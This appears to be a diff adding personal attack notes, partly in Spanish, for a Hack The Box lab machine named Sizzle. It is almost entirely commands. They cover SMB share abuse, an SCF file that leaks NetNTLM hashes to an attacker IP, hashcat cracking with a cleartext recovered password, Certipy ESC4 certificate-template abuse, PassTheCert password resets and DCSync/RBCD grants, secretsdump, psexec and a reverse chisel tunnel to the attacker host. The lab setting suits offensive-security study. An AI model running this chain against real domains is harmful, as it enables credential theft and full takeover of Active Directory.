@@ -1,0 +1,141 @@
+# Review Share Folders
+netexec smb 10.129.76.58 -u aaa -p '' --shares | tee shares.txt
+
+# Sacar los directorios
+cat share.txt | grep dir| cut -d '/' -f5,6 | sort -u > directorios.txt
+
+# Usar subl para quitar caracteres especiales
+cat directorios.txt | grep Users
+
+# Buscar directorios donde tengamos permisos
+for dir in $(cat userdirs.txt); do netexec smb 10.129.76.58 -u aaa -p '' --share "Department Shares" --put-file /etc/passwd $dir/passwd;done
+
+# Stealing Hashes:
+https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/
+
+https://github.com/Greenwolf/ntlm_theft
+
+# SCF
+[Shell]
+Command=2
+IconFile=\\10.10.14.162\share\redteamrd.ico
+[Taskbar]
+Command=ToggleDesktop
+
+# Crack Password amanda
+hashcat -m 5600  amanda.hash /usr/share/wordlists/rockyou.txt
+
+amanda
+Ashare1972
+
+# Evil-WinRM
+evil-winrm -i 10.129. -c amanda.cer -k amanda-de.key -S -r HTB
+
+
+# Manual Certificate request:
+openssl genrsa -aes256 -out amanda.key 2048
+Navigate to the website and download base64 cer
+
+
+## Certificate attacks:
+#Find all certificates
+certipy find -u amanda@htb.local -p Ashare1972 -dc-ip 10.129.75.246 -stdout
+
+# Find vulnerable configuration
+certipy find -u amanda@htb.local -p Ashare1972 -dc-ip 10.129.75.246 -vulnerable -stdout
+
+# Abuse ESC4
+certipy template -u amanda@htb.local -p Ashare1972 -dc-ip 10.129.76.58 -template SSL -save-old
+
+
+# Request certificate
+certipy req -u 'amanda@htb.local' -p Ashare1972 -ca HTB-SIZZLE-CA -template SSL
+
+
+# Extract Certificate and Key from PFX
+
+openssl pkcs12 -in amanda.pfx -nokeys -out amanda.cer
+
+openssl pkcs12 -in amanda.pfx -nocerts -out amanda.key
+
+#Optional
+openssl rsa -in amanda.key -out amanda-de.key
+
+# Connect via Evil-WinRM
+evil-winrm -i 10.129.75.246 -S -c amanda.cer -k amanda-de.key -r HTB
+
+certipy req -u 'amanda@htb.local' -p Ashare1972 -ca HTB-SIZZLE-CA -template SSL
+
+
+# Vulnerable ESC4
+certipy template -u 'amanda@htb.local' -p Ashare1972 -template SSL -save-old
+
+# Recover Template configuration:
+certipy template -u 'amanda@htb.local' -p Ashare1972 -template SSL -configuration ../certs/SSL.json 
+
+
+
+# Request certificate with alternative user
+certipy req -u 'amanda@htb.local' -p Ashare1972 -ca HTB-SIZZLE-CA -template SSL -upn Administrator
+
+# Request Certficiate as Admin
+proxychains4 certipy auth -pfx administrator.pfx -username Administrator -domain htb.local
+
+
+
+ERROR: KDC_ERR_PADATA_TYPE_NOSUPP
+
+https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
+
+TL;DR: Sometimes, Domain Controllers do not support PKINIT. This can be because their certificates do not have the Smart Card Logon EKU. However, several protocols — including LDAP — support Schannel, thus authentication through TLS. 
+
+PKINIT is a Kerberos mechanism that allows to use X.509 certificates as a pre-authentication method. It can be used to request a TGT, and even the NT hash of the account. 
+
+¿PKINIT no podemos utilizar el certificado para autenticarnos con Kerberos, entonces ahora qué podemos hacer?
+
+En el papel de Certified Pre-Owned, el equipo de SpecterOps mencionó que podemos usar certificados para autenticarnos con LDAPS porque utiliza SSL/TLS. 
+
+Hay 4 ataques que podemos hacer desde LDAPS:
+	- Dar privilegios de DCSync a un usuario.
+	- Modificar el attributo: msDS-AllowedToActOnBehalfOfOtherIdentity de una computadora para permitir un ataque de Resource Based Contrained Delegation (RBCD).
+	- Agregar una computadora al dominio (que sería útil para el ataque de RBCD).
+	- Resetear el password de una cuenta. 
+
+
+# Reset password Administrator:
+python3 passthecert.py -dc-ip  10.129.75.246 -crt administrator.crt -key administrator.key -domain htb.local -port 636 -action modify_user -target administrator -new-pass RedTeamRDRocks001
+
+# Grant DCSync Rights
+python3 passthecert.py -dc-ip  10.129.75.246 -crt administrator.crt -key administrator.key -domain htb.local -port 636 -action modify_user -target amanda -elevate
+
+# Add computer
+addcomputer.py -method LDAPS -computer-name 'EVIL01$' -computer-pass 'Str0ng3st_P@ssw0rd!' -dc-ip 10.129.75.246 -dc-host sizzle.htb.local htb.local/amanda:Ashare1972
+
+python3 passthecert.py -dc-ip  10.129.75.246 -crt administrator.crt -key administrator.key -domain htb.local -port 636 -action add_computer -computer-name 'REDTEAMRD$' -computer-pass RedTeamRD001
+
+# Delegate Domain to Our machine
+# Add RBCD delegation
+python3 passthecert.py -dc-ip  10.129.75.246 -crt administrator.crt -key administrator.key -domain htb.local -port 636 -action write_rbcd -delegate-to 'SIZZLE$' -delegate-from 'REDTEAMRD$'
+
+
+# Rubeus Get Credentials with certificate
+C:\Windows\Temp\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\amanda\Documents\cert.pfx /getcredentials
+
+
+# Get TGT Impersonate the Admin
+proxychains4 getST.py -spn 'cifs/sizzle.htb.local' -impersonate Administrator 'htb.local/REDTEAMRD$:RedTeamRD001'
+
+# DCSync
+KRB5CCNAME=Administrator.ccache proxychains4 secretsdump.py -k -no-pass sizzle.htb.local
+
+# PSExec
+KRB5CCNAME=Administrator.ccache proxychains4 psexec.py -k -no-pass sizzle.htb.local
+
+# Get TGT Impersonate the Admin - Windows
+C:/Windows/Temp/Rubeus.exe asktgt /user:"EVIL01$" /domain:htb.local /password:"Str0ng3st_P@ssw0rd!" /impersonate:Administrator /nowrap
+
+# Chisel Server Linux
+sudo chisel server --reverse -v -socks5
+
+# Chisel Client
+/windows/temp/chisel.exe client 10.10.14.162:8080 R:socks
